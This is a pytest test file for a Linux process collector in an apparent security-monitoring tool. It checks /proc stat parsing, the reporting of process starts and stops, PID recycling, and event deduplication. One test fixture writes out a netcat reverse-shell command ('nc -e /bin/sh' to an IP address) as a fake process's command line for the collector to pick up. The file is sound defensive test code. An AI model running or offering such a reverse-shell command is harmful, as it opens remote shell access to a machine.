"""Tests for `sentinel.collectors.process`.

The collector reads ``/proc``, which only exists on Linux, so every test drives
it against a synthetic proc tree built under ``tmp_path`` via the injectable
``proc_root``. Layers:

1. **Stat parsing** — ``parse_stat`` is pure; its handling of the awkward
   ``(comm)`` field (spaces, nested parens) and malformed lines is pinned.
2. **Scanning** — baseline is silent; start/stop/pid-recycle are classified;
   kernel threads, vanished processes, a missing ``/proc`` and the scan cap are
   all handled safely.
3. **Exactly-once (the payoff)** — through the real ``Pipeline``, a re-baseline
   race re-emits an identical start, yet the consumer sees it once.
"""

from __future__ import annotations

import asyncio
import contextlib
import shutil
from collections.abc import Callable
from pathlib import Path

import pytest

from sentinel.collectors.process import (
    ProcessCollector,
    _parse_comm_from_stat,
    parse_stat,
)
from sentinel.events import Event
from sentinel.pipeline.queue import BoundedEventQueue
from sentinel.pipeline.runner import Pipeline
from tests.conftest import DeadLetterNormalizer, settings_no_env_file


def _stat_line(pid: int, *, comm: str, ppid: int, starttime: int) -> str:
    """Build a /proc/<pid>/stat line with starttime at field 22."""
    after_comm = ["S", str(ppid), *["0"] * 17, str(starttime)]
    return f"{pid} ({comm}) " + " ".join(after_comm) + "\n"


def _mkproc(
    root: Path,
    pid: int,
    *,
    ppid: int = 1,
    starttime: int = 1_000,
    comm: str = "bash",
    cmdline: str | None = "bash -i",
    write_comm: bool = True,
) -> None:
    """Create a fake /proc/<pid> directory."""
    d = root / str(pid)
    d.mkdir()
    (d / "stat").write_text(
        _stat_line(pid, comm=comm, ppid=ppid, starttime=starttime), encoding="utf-8"
    )
    if write_comm:
        (d / "comm").write_text(comm + "\n", encoding="utf-8")
    raw = b"" if cmdline is None else cmdline.replace(" ", "\x00").encode() + b"\x00"
    (d / "cmdline").write_bytes(raw)


def _collector(root: Path, **kwargs: object) -> ProcessCollector:
    return ProcessCollector(proc_root=root, host="testhost", **kwargs)  # type: ignore[arg-type]


async def _drain(collector: ProcessCollector) -> list[Event]:
    """Run one scan/diff cycle and return the events it would enqueue."""
    queue = BoundedEventQueue(maxsize=256)
    await collector._drain_once(queue)
    events: list[Event] = []
    while not queue.empty():
        events.append(await queue.get())
        queue.task_done()
    return events


async def _wait_for(predicate: Callable[[], bool], timeout: float = 5.0) -> bool:  # noqa: ASYNC109 — poll loop, not an `asyncio.timeout()` block
    loop = asyncio.get_event_loop()
    deadline = loop.time() + timeout
    while loop.time() < deadline:
        if predicate():
            return True
        await asyncio.sleep(0.01)
    return False


class TestParseStat:
    def test_normal_line(self) -> None:
        assert parse_stat(_stat_line(7, comm="bash", ppid=3, starttime=999)) == (3, 999)

    def test_comm_with_spaces_and_parens(self) -> None:
        line = _stat_line(7, comm="we (ir)d proc", ppid=42, starttime=123)
        assert parse_stat(line) == (42, 123)

    def test_too_few_fields_returns_none(self) -> None:
        assert parse_stat("7 (bash) S 3 0 0") is None

    def test_no_paren_returns_none(self) -> None:
        assert parse_stat("garbage with no parens at all") is None

    def test_non_integer_fields_returns_none(self) -> None:
        bad = "7 (bash) S notapid " + " ".join(["0"] * 18)
        assert parse_stat(bad) is None

    def test_parse_comm_returns_empty_without_parens(self) -> None:
        assert _parse_comm_from_stat("no parens at all") == ""


class TestConstruction:
    def test_rejects_non_positive_poll_interval(self, tmp_path: Path) -> None:
        with pytest.raises(ValueError, match="poll_interval"):
            ProcessCollector(proc_root=tmp_path, poll_interval=0)


class TestScanning:
    @pytest.mark.asyncio
    async def test_first_scan_is_silent_baseline(self, tmp_path: Path) -> None:
        _mkproc(tmp_path, 100)
        _mkproc(tmp_path, 200)
        collector = _collector(tmp_path)

        assert await _drain(collector) == []
        assert collector.stats["tracked"] == 2

    @pytest.mark.asyncio
    async def test_detects_started(self, tmp_path: Path) -> None:
        collector = _collector(tmp_path)
        await _drain(collector)  # empty baseline

        _mkproc(tmp_path, 4242, ppid=1000, comm="nc", cmdline="nc -e /bin/sh 10.0.0.1")
        events = await _drain(collector)

        assert len(events) == 1
        event = events[0]
        assert event.event.action == "process_started"
        assert event.event.category.value == "process"
        assert event.process.pid == 4242
        assert event.process.ppid == 1000
        assert event.process.name == "nc"
        assert event.process.command_line == "nc -e /bin/sh 10.0.0.1"

    @pytest.mark.asyncio
    async def test_detects_stopped(self, tmp_path: Path) -> None:
        _mkproc(tmp_path, 555, comm="sleep")
        collector = _collector(tmp_path)
        await _drain(collector)  # baseline includes 555

        shutil.rmtree(tmp_path / "555")
        events = await _drain(collector)

        assert len(events) == 1
        assert events[0].event.action == "process_stopped"
        assert events[0].process.pid == 555

    @pytest.mark.asyncio
    async def test_recycled_pid_emits_stop_then_start(self, tmp_path: Path) -> None:
        _mkproc(tmp_path, 800, comm="old", starttime=1_000)
        collector = _collector(tmp_path)
        await _drain(collector)

        # Same pid, different starttime → a different process instance.
        shutil.rmtree(tmp_path / "800")
        _mkproc(tmp_path, 800, comm="new", starttime=2_000)
        events = await _drain(collector)

        actions = sorted(e.event.action for e in events)
        assert actions == ["process_started", "process_stopped"]
        # The two events have distinct ids (different starttime in the seed).
        assert len({e.event.id for e in events}) == 2

    @pytest.mark.asyncio
    async def test_kernel_thread_has_no_command_line(self, tmp_path: Path) -> None:
        collector = _collector(tmp_path)
        await _drain(collector)

        _mkproc(tmp_path, 2, comm="kthreadd", cmdline=None)  # empty cmdline
        events = await _drain(collector)

        assert len(events) == 1
        assert events[0].process.command_line is None
        assert events[0].process.name == "kthreadd"

    @pytest.mark.asyncio
    async def test_comm_falls_back_to_stat_when_file_absent(self, tmp_path: Path) -> None:
        collector = _collector(tmp_path)
        await _drain(collector)

        _mkproc(tmp_path, 321, comm="from-stat", write_comm=False)
        events = await _drain(collector)

        assert len(events) == 1
        assert events[0].process.name == "from-stat"

    @pytest.mark.asyncio
    async def test_vanished_process_is_skipped(self, tmp_path: Path) -> None:
        # A pid dir with no stat file (raced exit) must not crash the scan.
        (tmp_path / "999").mkdir()
        collector = _collector(tmp_path)

        assert await _drain(collector) == []
        assert collector.stats["tracked"] == 0

    @pytest.mark.asyncio
    async def test_malformed_stat_is_skipped(self, tmp_path: Path) -> None:
        (tmp_path / "42").mkdir()
        (tmp_path / "42" / "stat").write_text("totally unparseable", encoding="utf-8")
        collector = _collector(tmp_path)

        assert await _drain(collector) == []
        assert collector.stats["tracked"] == 0

    @pytest.mark.asyncio
    async def test_missing_cmdline_file_yields_none(self, tmp_path: Path) -> None:
        collector = _collector(tmp_path)
        await _drain(collector)

        _mkproc(tmp_path, 88, comm="weird")
        (tmp_path / "88" / "cmdline").unlink()  # vanished mid-read
        events = await _drain(collector)

        assert len(events) == 1
        assert events[0].process.command_line is None

    @pytest.mark.asyncio
    async def test_non_numeric_entries_are_ignored(self, tmp_path: Path) -> None:
        _mkproc(tmp_path, 10)
        (tmp_path / "self").mkdir()
        (tmp_path / "cpuinfo").write_text("...", encoding="utf-8")
        collector = _collector(tmp_path)
        await _drain(collector)

        assert collector.stats["tracked"] == 1

    @pytest.mark.asyncio
    async def test_missing_proc_root_is_not_fatal(self, tmp_path: Path) -> None:
        collector = _collector(tmp_path / "no-proc-here")

        assert await _drain(collector) == []
        assert collector.stats["tracked"] == 0

    @pytest.mark.asyncio
    async def test_max_procs_cap_bounds_the_scan(self, tmp_path: Path) -> None:
        for pid in range(10, 15):
            _mkproc(tmp_path, pid)
        collector = _collector(tmp_path, max_procs=2)
        await _drain(collector)

        assert collector.stats["tracked"] == 2

    @pytest.mark.asyncio
    async def test_executable_resolved_from_exe_symlink(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(Path, "readlink", lambda _self: "/usr/bin/python3")
        collector = _collector(tmp_path)
        await _drain(collector)

        _mkproc(tmp_path, 70, comm="python3")
        events = await _drain(collector)

        assert len(events) == 1
        assert events[0].process.executable == "/usr/bin/python3"


class TestDeadLetter:
    @pytest.mark.asyncio
    async def test_unmappable_record_is_skipped_not_enqueued(self, tmp_path: Path) -> None:
        collector = _collector(tmp_path, normalizer=DeadLetterNormalizer())
        await _drain(collector)  # baseline

        _mkproc(tmp_path, 4321, comm="payload")
        events = await _drain(collector)

        assert events == []
        assert collector.stats["emitted"] == 0


class TestExactlyOnceUnderRebaseline:
    @pytest.mark.asyncio
    async def test_rebaseline_reemit_is_deduped(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("SENTINEL_ENV", "test")
        monkeypatch.setenv("SENTINEL_DEDUP_WINDOW_SECONDS", "300")
        settings = settings_no_env_file()

        received: list[str] = []

        async def consumer(event: Event) -> None:
            received.append(event.event.id)

        collector = _collector(tmp_path, poll_interval=0.02)
        pipeline = Pipeline(settings)
        pipeline.set_consumer(consumer)
        pipeline.register(collector)

        run_task = asyncio.create_task(pipeline.run())
        try:
            assert await _wait_for(lambda: collector._seeded)  # empty baseline

            _mkproc(tmp_path, 1337, comm="payload", starttime=5_000)
            assert await _wait_for(
                lambda: collector.stats["emitted"] == 1 and pipeline.stats["queue_size"] == 0
            )

            # Re-baseline race: forget the process, re-detect it as started with
            # the same (pid, starttime) → identical event.id.
            collector._baseline = {}
            assert await _wait_for(
                lambda: collector.stats["emitted"] == 2 and pipeline.stats["queue_size"] == 0
            )
        finally:
            await pipeline.stop()
            with contextlib.suppress(asyncio.CancelledError):
                await asyncio.wait_for(run_task, timeout=5.0)

        assert collector.stats["emitted"] == 2
        assert len(received) == 1
        assert pipeline.stats["processed"] == 1
        assert pipeline.stats["deduped"] == 1
